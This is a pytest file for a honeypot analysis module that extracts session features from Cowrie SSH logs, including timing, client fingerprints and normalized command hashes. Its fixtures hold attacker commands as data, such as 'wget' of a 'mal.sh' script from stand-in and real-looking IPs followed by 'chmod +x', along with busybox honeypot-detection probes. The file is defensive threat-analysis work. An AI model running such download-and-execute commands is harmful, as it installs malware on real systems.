# honeypot/analysis/fingerprinting/tests/test_features.py
import json
from datetime import datetime

import polars as pl
import pytest
from features import extract_session_features


def _event(
    session: str,
    eventid: str,
    timestamp: str,
    *,
    command_input: str | None = None,
    duration_ms: float | None = None,
    username: str | None = None,
    password: str | None = None,
    agent_type: str | None = None,
    raw: dict | None = None,
    sensor: str = "sensor-01",
    src_ip: str = "1.2.3.4",
    cloud_provider: str = "aws",
) -> dict:
    return {
        "event_timestamp": datetime.fromisoformat(timestamp),
        "eventid": eventid,
        "session": session,
        "sensor": sensor,
        "src_ip": src_ip,
        "cloud_provider": cloud_provider,
        "command_input": command_input,
        "duration_ms": duration_ms,
        "username": username,
        "password": password,
        "agent_type": agent_type,
        "raw": json.dumps(raw) if raw is not None else None,
    }


class TestClientFingerprint:
    def test_extracted_from_raw_json(self) -> None:
        events = pl.DataFrame(
            [
                _event(
                    "s1",
                    "cowrie.client.version",
                    "2026-08-19T10:00:00Z",
                    raw={"version": "SSH-2.0-Go"},
                ),
                _event(
                    "s1",
                    "cowrie.client.kex",
                    "2026-08-19T10:00:01Z",
                    raw={"hassh": "abc123"},
                ),
            ]
        )

        row = extract_session_features(events).row(0, named=True)

        assert row["client_version"] == "SSH-2.0-Go"
        assert row["hassh"] == "abc123"
        assert row["is_ssh_client"] is True

    def test_non_ssh_protocol_noise_is_not_flagged_as_ssh_client(self) -> None:
        # Real traffic includes non-SSH protocol probes (TLS ClientHellos,
        # HTTP/FTP probes, scanner payloads) landing verbatim in this field.
        events = pl.DataFrame(
            [
                _event(
                    "s1",
                    "cowrie.client.version",
                    "2026-08-19T10:00:00Z",
                    raw={"version": "GET / HTTP/1.1"},
                )
            ]
        )

        row = extract_session_features(events).row(0, named=True)

        assert row["client_version"] == "GET / HTTP/1.1"
        assert row["is_ssh_client"] is False

    def test_no_client_version_event_is_not_flagged_as_ssh_client(self) -> None:
        events = pl.DataFrame(
            [_event("s1", "cowrie.session.connect", "2026-08-19T10:00:00Z")]
        )

        row = extract_session_features(events).row(0, named=True)

        assert row["client_version"] is None
        assert row["is_ssh_client"] is False

    def test_missing_raw_json_does_not_crash(self) -> None:
        events = pl.DataFrame(
            [_event("s1", "cowrie.client.version", "2026-08-19T10:00:00Z", raw=None)]
        )

        row = extract_session_features(events).row(0, named=True)

        assert row["client_version"] is None


class TestInterCommandTiming:
    def test_computed_from_ordered_command_events(self) -> None:
        events = pl.DataFrame(
            [
                _event(
                    "s1",
                    "cowrie.command.input",
                    "2026-08-19T10:00:00Z",
                    command_input="ls",
                ),
                _event(
                    "s1",
                    "cowrie.command.input",
                    "2026-08-19T10:00:02Z",
                    command_input="whoami",
                ),
                _event(
                    "s1",
                    "cowrie.command.input",
                    "2026-08-19T10:00:06Z",
                    command_input="wget x",
                ),
            ]
        )

        row = extract_session_features(events).row(0, named=True)

        assert row["command_count"] == 3
        assert row["commands"] == ["ls", "whoami", "wget x"]
        assert row["inter_command_min_s"] == pytest.approx(2.0)
        assert row["inter_command_mean_s"] == pytest.approx(3.0)

    def test_sub_second_intervals_are_not_truncated(self) -> None:
        events = pl.DataFrame(
            [
                _event(
                    "s1",
                    "cowrie.command.input",
                    "2026-08-19T10:00:00.000000Z",
                    command_input="ls",
                ),
                _event(
                    "s1",
                    "cowrie.command.input",
                    "2026-08-19T10:00:00.250000Z",
                    command_input="whoami",
                ),
            ]
        )

        row = extract_session_features(events).row(0, named=True)

        assert row["inter_command_mean_s"] == pytest.approx(0.25)

    def test_single_command_has_no_timing_stats(self) -> None:
        events = pl.DataFrame(
            [
                _event(
                    "s1",
                    "cowrie.command.input",
                    "2026-08-19T10:00:00Z",
                    command_input="ls",
                )
            ]
        )

        row = extract_session_features(events).row(0, named=True)

        assert row["command_count"] == 1
        assert row["inter_command_mean_s"] is None
        assert row["inter_command_std_s"] is None
        assert row["inter_command_min_s"] is None

    def test_no_commands_has_zero_count_and_no_timing_stats(self) -> None:
        events = pl.DataFrame(
            [_event("s1", "cowrie.session.connect", "2026-08-19T10:00:00Z")]
        )

        row = extract_session_features(events).row(0, named=True)

        assert row["command_count"] == 0
        assert row["commands"] == []
        assert row["inter_command_mean_s"] is None

    def test_two_commands_gives_population_std_not_null(self) -> None:
        events = pl.DataFrame(
            [
                _event(
                    "s1",
                    "cowrie.command.input",
                    "2026-08-19T10:00:00Z",
                    command_input="ls",
                ),
                _event(
                    "s1",
                    "cowrie.command.input",
                    "2026-08-19T10:00:05Z",
                    command_input="whoami",
                ),
            ]
        )

        row = extract_session_features(events).row(0, named=True)

        assert row["inter_command_std_s"] == pytest.approx(0.0)


class TestDurationAndCredentials:
    def test_captured_from_relevant_events(self) -> None:
        events = pl.DataFrame(
            [
                _event(
                    "s1",
                    "cowrie.login.failed",
                    "2026-08-19T10:00:00Z",
                    username="admin",
                    password="admin123",
                ),
                _event(
                    "s1",
                    "cowrie.session.closed",
                    "2026-08-19T10:05:00Z",
                    duration_ms=300000,
                ),
            ]
        )

        row = extract_session_features(events).row(0, named=True)

        assert row["username"] == "admin"
        assert row["password"] == "admin123"
        assert row["session_duration_ms"] == 300000


class TestAgentReportFlag:
    def test_true_when_any_row_has_agent_type(self) -> None:
        events = pl.DataFrame(
            [
                _event(
                    "s1",
                    "cowrie.command.input",
                    "2026-08-19T10:00:00Z",
                    command_input="echo x",
                ),
                _event(
                    "s1",
                    "cowrie.command.input",
                    "2026-08-19T10:00:01Z",
                    agent_type="Gemini-2.5",
                ),
            ]
        )

        row = extract_session_features(events).row(0, named=True)

        assert bool(row["has_agent_report"])

    def test_false_when_no_row_has_agent_type(self) -> None:
        events = pl.DataFrame(
            [_event("s1", "cowrie.session.connect", "2026-08-19T10:00:00Z")]
        )

        row = extract_session_features(events).row(0, named=True)

        assert not bool(row["has_agent_report"])


class TestMultipleSessions:
    def test_grouped_independently(self) -> None:
        events = pl.DataFrame(
            [
                _event(
                    "s1",
                    "cowrie.command.input",
                    "2026-08-19T10:00:00Z",
                    command_input="ls",
                ),
                _event(
                    "s2",
                    "cowrie.command.input",
                    "2026-08-19T10:00:00Z",
                    command_input="whoami",
                ),
            ]
        )

        result = extract_session_features(events)

        assert set(result["session"].to_list()) == {"s1", "s2"}
        assert result.height == 2


class TestCommandSequenceHash:
    def test_identical_sequences_across_sessions_hash_the_same(self) -> None:
        def _commands(session: str) -> list[dict]:
            return [
                _event(
                    session,
                    "cowrie.command.input",
                    "2026-08-19T10:00:00Z",
                    command_input="wget http://x/mal.sh",
                ),
                _event(
                    session,
                    "cowrie.command.input",
                    "2026-08-19T10:00:01Z",
                    command_input="chmod +x mal.sh",
                ),
            ]

        events = pl.DataFrame([*_commands("s1"), *_commands("s2")])

        result = extract_session_features(events).sort("session")

        hashes = result["command_sequence_hash"].to_list()
        assert hashes[0] == hashes[1]
        assert hashes[0] is not None

    def test_different_order_hashes_differently(self) -> None:
        events = pl.DataFrame(
            [
                _event(
                    "s1",
                    "cowrie.command.input",
                    "2026-08-19T10:00:00Z",
                    command_input="ls",
                ),
                _event(
                    "s1",
                    "cowrie.command.input",
                    "2026-08-19T10:00:01Z",
                    command_input="whoami",
                ),
                _event(
                    "s2",
                    "cowrie.command.input",
                    "2026-08-19T10:00:00Z",
                    command_input="whoami",
                ),
                _event(
                    "s2",
                    "cowrie.command.input",
                    "2026-08-19T10:00:01Z",
                    command_input="ls",
                ),
            ]
        )

        result = extract_session_features(events).sort("session")

        hashes = result["command_sequence_hash"].to_list()
        assert hashes[0] != hashes[1]

    def test_no_commands_hashes_to_none(self) -> None:
        events = pl.DataFrame(
            [_event("s1", "cowrie.session.connect", "2026-08-19T10:00:00Z")]
        )

        row = extract_session_features(events).row(0, named=True)

        assert row["command_sequence_hash"] is None

    def test_naive_concatenation_would_collide_but_separator_prevents_it(
        self,
    ) -> None:
        # ["ab", "c"] and ["a", "bc"] would join to the same string with no
        # separator -- the \x1f join in _hash_commands must keep them apart.
        events = pl.DataFrame(
            [
                _event(
                    "s1",
                    "cowrie.command.input",
                    "2026-08-19T10:00:00Z",
                    command_input="ab",
                ),
                _event(
                    "s1",
                    "cowrie.command.input",
                    "2026-08-19T10:00:01Z",
                    command_input="c",
                ),
                _event(
                    "s2",
                    "cowrie.command.input",
                    "2026-08-19T10:00:00Z",
                    command_input="a",
                ),
                _event(
                    "s2",
                    "cowrie.command.input",
                    "2026-08-19T10:00:01Z",
                    command_input="bc",
                ),
            ]
        )

        result = extract_session_features(events).sort("session")

        hashes = result["command_sequence_hash"].to_list()
        assert hashes[0] != hashes[1]


class TestCommandNormalizationBeforeHashing:
    def _session_hash(self, commands: list[str], session: str = "s1") -> str | None:
        events = pl.DataFrame(
            [
                _event(
                    session,
                    "cowrie.command.input",
                    f"2026-08-19T10:00:{i:02d}Z",
                    command_input=cmd,
                )
                for i, cmd in enumerate(commands)
            ]
        )
        return extract_session_features(events).row(0, named=True)[
            "command_sequence_hash"
        ]

    def test_busybox_verification_tag_is_stripped(self) -> None:
        # Botnets append a random per-connection tag after busybox to
        # verify they're talking to a real shell, not a honeypot.
        a = self._session_hash(["enable", "/bin/busybox V3G4"])
        b = self._session_hash(["enable", "/bin/busybox CORONA"])

        assert a == b

    def test_multi_arg_busybox_invocation_is_not_stripped(self) -> None:
        # "/bin/busybox hostname X" is a real applet call (different
        # command), not a bare verification-tag probe -- must stay distinct.
        tag_probe = self._session_hash(["/bin/busybox V3G4"])
        real_call = self._session_hash(["/bin/busybox hostname slur"])

        assert tag_probe != real_call

    def test_embedded_ip_is_normalized(self) -> None:
        a = self._session_hash(["wget http://185.93.89.72/mal.sh"])
        b = self._session_hash(["wget http://77.90.185.66/mal.sh"])

        assert a == b

    def test_consecutive_duplicate_commands_are_collapsed(self) -> None:
        doubled = self._session_hash(["enable", "enable", "sh", "sh"])
        single = self._session_hash(["enable", "sh"])

        assert doubled == single

    def test_non_consecutive_repeats_are_not_collapsed(self) -> None:
        # Only immediately-adjacent repeats are retry noise -- "enable"
        # appearing again later, after other commands, is real signal.
        with_gap = self._session_hash(["enable", "sh", "enable"])
        without = self._session_hash(["enable", "sh"])

        assert with_gap != without

    def test_normalization_does_not_mutate_the_raw_commands_field(self) -> None:
        events = pl.DataFrame(
            [
                _event(
                    "s1",
                    "cowrie.command.input",
                    "2026-08-19T10:00:00Z",
                    command_input="/bin/busybox V3G4",
                ),
                _event(
                    "s1",
                    "cowrie.command.input",
                    "2026-08-19T10:00:01Z",
                    command_input="/bin/busybox V3G4",
                ),
            ]
        )

        row = extract_session_features(events).row(0, named=True)

        # commands stays the raw, unnormalized, un-deduped log -- only the
        # hash used for clustering is normalized.
        assert row["commands"] == ["/bin/busybox V3G4", "/bin/busybox V3G4"]
